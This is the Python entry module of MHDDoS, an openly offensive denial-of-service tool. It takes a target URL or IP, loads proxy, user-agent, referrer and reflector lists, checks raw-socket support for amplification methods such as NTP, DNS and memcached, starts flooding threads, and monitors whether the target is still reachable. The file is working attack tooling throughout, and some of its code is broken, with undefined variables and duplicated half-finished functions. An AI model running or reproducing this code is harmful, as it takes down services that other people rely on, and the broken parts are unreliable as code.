import os
from contextlib import suppress
from json import load
from logging import basicConfig, getLogger, shutdown
from pathlib import Path
from socket import (gethostbyname)
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time, perf_counter
from typing import List, Union

import requests
import validators
from PyRoxy import Tools as ProxyTools, Proxy, ProxyType
from icmplib import Host
from requests import Response
from yarl import URL

from MHDDoS.methods.layer_4 import Layer4
from MHDDoS.methods.layer_7 import Layer7
from MHDDoS.methods.methods import Methods
from MHDDoS.methods.tools import Tools
from MHDDoS.utils.console_utils import clear_lines_from_console
from MHDDoS.utils.healthcheck_utils import TargetHealthCheckUtils
from MHDDoS.utils.logs import craft_outreach_log_message
from MHDDoS.utils.misc import Counter
from MHDDoS.utils.proxies import ProxyManager

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")

__version__: str = "2.3 SNAPSHOT"
__dir__: Path = Path(__file__).parent
bombardier_path: str = ""


def exit(*message):
    if message:
        logger.error(" ".join(message))
    shutdown()
    _exit(1)


# def load(
#         proxies_file_path: str,
#         useragents_file_path: str,
#         referrers_file_path: str
# ):
#     # TODO: load all this stuff
#     pass


def read_configuration_file_text(file_path_or_url: str) -> str | None:
    """
    Loads text content from the given file or URL.
    If given URL, will read text from it and return it.
    If given a relative path, will return the contents of the file at this path.
        If the file doesn't exist relative to workdir, will look for this file in default MHDDoS/files folder.
    If the file could not be located/read, will return None.

    Args:
        file_path_or_url: Absolute path, relative path or URL of the file.

    Returns:
        Text content of the file if it was located, None otherwise.
    """
    # if URL, load with a request
    if validators.url(file_path_or_url):
        response = requests.get(file_path_or_url, timeout=10)
        return response.text

    # if not URL, try to look locally
    path = Path(file_path_or_url)
    if path.is_file():
        return path.read_text()
    elif not path.is_absolute():
        # if not found relative to the workdir, look relative to 'MHDDoS/files'
        path = Path(__dir__ / "files/" / path)
        if path.is_file():
            return path.read_text()

    return None


def load_proxies(proxies_file_path: str, proxy_type: ProxyType = ProxyType.SOCKS5) -> List[Proxy]:
    if validators.url(proxies_file_path):
        # TODO: download file if it's a URL
        pass

    # look for this file in
    proxy_path_relative = proxies_file_path
    proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
    if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
        proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)

    proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
    proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), attack_method, target_address)


def load_user_agents(user_agents_file_path: str) -> List[str]:
    if validators.url(proxies_file_path):
        # TODO: download file if it's a URL
        pass

    # look for this file in

    # look for this file in default MHDDoS folder
    useragent_file_path = Path(__dir__ / "files/useragent.txt")
    if not useragent_file_path.exists():
        exit("The Useragent file doesn't exist ")
    uagents = set(a.strip()
                  for a in useragent_file_path.open("r+").readlines())
    if not uagents:
        exit("Empty Useragent File ")


def attack(
    attack_method: str,
    target_address: str,  # URL or IP
    target_port: int,
    proxies_file_path: str,
    user_agents_file_path: str,
    referrers_file_path: str
):
    attack_threads: List[Thread] = []

    proxies_config = []  # TODO: we WILL load proxies here
    with open(__dir__ / "config.json") as f:
        proxies_config = load(f)

    # SANITY CHECKS
    # check attack method
    if attack_method not in Methods.ALL_METHODS:
        exit(f"Provided method ('{attack_method}') not found. Available methods: {', '.join(Methods.ALL_METHODS)}")
    # check if address is IPv4 or URL
    is_ip = validators.ipv4(target_address)
    is_url = False
    if not is_ip:
        target_address = Tools.ensure_http_present(target_address)
        is_url = validators.url(target_address)
    if not is_ip and not is_url:
        exit(f"Provided target address ('{target_address}') is neither a valid IPv4 nor a URL. Please provide a valid target address next time.")

    # counters
    REQUESTS_SENT = Counter()
    BYTES_SENT = Counter()
    TOTAL_REQUESTS_SENT = Counter()
    TOTAL_BYTES_SENT = Counter()

    if attack_method in Methods.LAYER7_METHODS:

        # HANDLE PARAMETERS
        url = URL(target_address)
        host = url.host
        try:
            host = gethostbyname(url.host)
        except Exception as e:
            exit('Cannot resolve hostname ', url.host, e)
        ip = Tools.get_ip(target_address)
        # print(f"IP: {ip}")
        # print(f"Port: {url.port}")
        threads = int(argv[4])
        rpc = int(argv[6])
        timer = int(argv[7])

        # HANDLE PROXIES
        proxy_type = int(argv[3].strip())
        proxy_path_relative = argv[5].strip()
        proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
        if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
            proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)

        proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
        proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), attack_method, target_address)

        # HANDLE BOMBARDIER
        global bombardier_path
        bombardier_path = Path(__dir__ / "go/bin/bombardier")
        if attack_method == "BOMB":
            assert (
                    bombardier_path.exists()
                    or bombardier_path.with_suffix('.exe').exists()
            ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"

        if len(argv) == 9:
            logger.setLevel("DEBUG")

        # HANDLE USERAGENTS
        useragent_file_path = Path(__dir__ / "files/useragent.txt")
        if not useragent_file_path.exists():
            exit("The Useragent file doesn't exist ")
        uagents = set(a.strip()
                      for a in useragent_file_path.open("r+").readlines())
        if not uagents: exit("Empty Useragent File ")

        # HANDLE REFERRERS
        referrers_file_path = Path(__dir__ / "files/referers.txt")
        if not referrers_file_path.exists():
            exit("The Referer file doesn't exist ")
        referers = set(a.strip()
                       for a in referrers_file_path.open("r+").readlines())
        if not referers: exit("Empty Referer File ")

        if threads > 1000:
            logger.warning("Number of threads is higher than 1000")
        if rpc > 100:
            logger.warning("RPC (Requests Per Connection) number is higher than 100")

        # TODO: manage threads actively
        for _ in range(threads):
            Layer7(url, host, attack_method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()

    if attack_method in Methods.LAYER4_METHODS:
        # HANDLE PARAMETERS
        url = URL(target_address)
        port = url.port
        host = url.host

        try:
            host = gethostbyname(host)
        except Exception as e:
            exit('Cannot resolve hostname ', url.host, e)

        if port > 65535 or port < 1:
            exit("Invalid Port [Min: 1 / Max: 65535] ")

        RAW_SOCKET_METHODS = {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"}
        if attack_method in RAW_SOCKET_METHODS \
                and not Tools.checkRawSocket():
            exit("Cannot Create Raw Socket")

        threads = int(argv[3])
        timer = int(argv[4])
        proxies = None
        referrers = None
        if not port:
            logger.warning("Port Not Selected, Set To Default: 80")
            port = 80

        if len(argv) >= 6:
            argfive = argv[5].strip()
            if argfive:
                referrers_file_path = Path(__dir__ / "files" / argfive)
                if attack_method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                    if not referrers_file_path.exists():
                        exit("The reflector file doesn't exist")
                    if len(argv) == 7:
                        logger.setLevel("DEBUG")
                        referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
                    if not referrers:
                        exit("Empty Reflector File ")

                elif argfive.isdigit() and len(argv) >= 7:
                    if len(argv) == 8:
                        logger.setLevel("DEBUG")
                    proxy_type = int(argfive)
                    proxy_path_relative = argv[6].strip()
                    proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                    if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                        proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                    proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
                    proxies = ProxyManager.validateProxyList(proxies, ip, port, attack_method, target_address)
                    if attack_method not in {"MINECRAFT", "MCBOT", "TCP"}:
                        exit("this attack_method cannot use for layer4 proxy")

                else:
                    logger.setLevel("DEBUG")

        for _ in range(threads):
            Layer4((host, port), referrers, attack_method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
    
    # TODO: input parameters
    # TODO: launch a lot of threads according to the given methods
    # TODO: loop:
    #       - check CPU utilization
    #       - decrease/increase threads
    #       - each thread gets it's own proxy?
    pass


def start():
    # COUNTERS
    REQUESTS_SENT = Counter()
    BYTES_SENT = Counter()
    TOTAL_REQUESTS_SENT = Counter()
    TOTAL_BYTES_SENT = Counter()

    with open(__dir__ / "config.json") as f:
        config = load(f)
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                Tools.runConsole()
            if one == "STOP":
                Tools.stop()

            method = one
            host = None
            url = None
            urlraw = None
            event = Event()
            event.clear()
            host = None
            urlraw = argv[2].strip()
            urlraw = Tools.ensure_http_present(urlraw)
            port = None
            proxies = None

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:

                # HANDLE PARAMETERS
                url = URL(urlraw)
                host = url.host
                try:
                    host = gethostbyname(url.host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)
                ip = Tools.get_ip(urlraw)
                # print(f"IP: {ip}")
                # print(f"Port: {url.port}")
                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])

                # HANDLE PROXIES
                proxy_type = int(argv[3].strip())
                proxy_path_relative = argv[5].strip()
                proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                    proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)

                proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), method, urlraw)

                # HANDLE BOMBARDIER
                global bombardier_path
                bombardier_path = Path(__dir__ / "go/bin/bombardier")
                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                # HANDLE USERAGENTS
                useragent_file_path = Path(__dir__ / "files/useragent.txt")
                if not useragent_file_path.exists():
                    exit("The Useragent file doesn't exist ")
                uagents = set(a.strip()
                              for a in useragent_file_path.open("r+").readlines())
                if not uagents: exit("Empty Useragent File ")

                # HANDLE REFERRERS
                referrers_file_path = Path(__dir__ / "files/referers.txt")
                if not referrers_file_path.exists():
                    exit("The Referer file doesn't exist ")
                referers = set(a.strip()
                               for a in referrers_file_path.open("r+").readlines())
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Number of threads is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Requests Per Connection) number is higher than 100")

                # TODO: manage threads actively
                for _ in range(threads):
                    Layer7(url, host, method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()

            if method in Methods.LAYER4_METHODS:
                # HANDLE PARAMETERS
                url = URL(urlraw)
                port = url.port
                host = url.host

                try:
                    host = gethostbyname(host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                        not Tools.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                referrers = None
                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        referrers_file_path = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                            if not referrers_file_path.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                                referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
                            if not referrers:
                                exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_type = int(argfive)
                            proxy_path_relative = argv[6].strip()
                            proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                            if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                                proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                            proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                            proxies = ProxyManager.validateProxyList(proxies, ip, port, method, urlraw)
                            if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")

                for _ in range(threads):
                    Layer4((host, port), referrers, method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()

            # start health check thread
            if not port:
                if urlraw and "https://" in urlraw:
                    port = 443
                else:
                    port = 80
            if not host:
                host = Tools.get_ip(urlraw)
            ip = host
            health_check_thread = Thread(
                daemon=True,
                target=target_health_check_loop,
                args=(HEALTH_CHECK_INTERVAL, ip, port, method, urlraw, proxies)
            )
            health_check_thread.start()

            logger.info(f"Attack Started to {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
            event.set()
            ts = time()

            while time() < ts + timer:
                # log_attack_status()

                # update request counts
                TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
                TOTAL_BYTES_SENT += int(BYTES_SENT)
                REQUESTS_SENT.set(0)
                BYTES_SENT.set(0)

                # craft the status log message
                pps = Tools.humanformat(int(REQUESTS_SENT))
                bps = Tools.humanbytes(int(BYTES_SENT))
                tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
                tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
                logger.info(f"Total bytes sent: {tb}, total requests: {tp}")

                sleep(1)

            event.clear()
            exit()

        Tools.usage()


last_target_health_check_timestamp: float = 0
"""Time when the last target health check was started."""

HEALTH_CHECK_INTERVAL = 10
is_first_health_check_done: bool = False
last_l4_result: Host = None
last_l7_response: Union[Response, None] = None
last_l4_proxied_results: List[Host] = None
last_l7_proxied_responses: List[Union[Response, None]] = None


def target_health_check_loop(interval: float,
                             ip: str,
                             port: int,
                             method: str,
                             url: Union[str, None],
                             proxies: Union[set, None]):
    global is_first_health_check_done, last_l4_result, last_l7_response, \
        last_l4_proxied_results, last_l7_proxied_responses, last_target_health_check_timestamp

    while True:
        start_timestamp = perf_counter()

        last_l4_result, \
        last_l7_response, \
        last_l4_proxied_results, \
        last_l7_proxied_responses = TargetHealthCheckUtils.health_check(ip, port, method, url, proxies,
                                                                        layer_4_retries=1,
                                                                        layer_4_timeout=2,
                                                                        layer_4_interval=0.2,
                                                                        layer_7_timeout=10)

        last_target_health_check_timestamp = time()
        is_first_health_check_done = True

        while perf_counter() - start_timestamp < interval:
            sleep(0.1)


status_logging_started = False


def log_attack_status_new():
    global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started

    # craft status message
    message = "\n"
    message += craft_performance_log_message()
    message += craft_outreach_log_message(
        is_first_health_check_done,
        last_target_health_check_timestamp,
        last_l4_result,
        last_l4_proxied_results,
        last_l7_response,
        last_l7_proxied_responses
    )

    # log the message
    if not status_logging_started:
        status_logging_started = True
    else:
        message_line_count = message.count("\n") + 1
        clear_lines_from_console(message_line_count)
        # pass
    print(message, end="")


def craft_performance_log_message():
    # craft the status log message
    pps = Tools.humanformat(int(REQUESTS_SENT))
    bps = Tools.humanbytes(int(BYTES_SENT))
    tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
    tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
    status_string = f"Status:\n" \
                    f"    Outgoing data:\n" \
                    f"       Per second:\n" \
                    f"          Packets/s: {pps}\n" \
                    f"          Bytes/s:   {bps}\n" \
                    f"       Total since the attack started:\n" \
                    f"          Packets sent: {tp}\n" \
                    f"          Bytes sent:   {tb}\n"

    return status_string


if __name__ == '__main__':
    start()
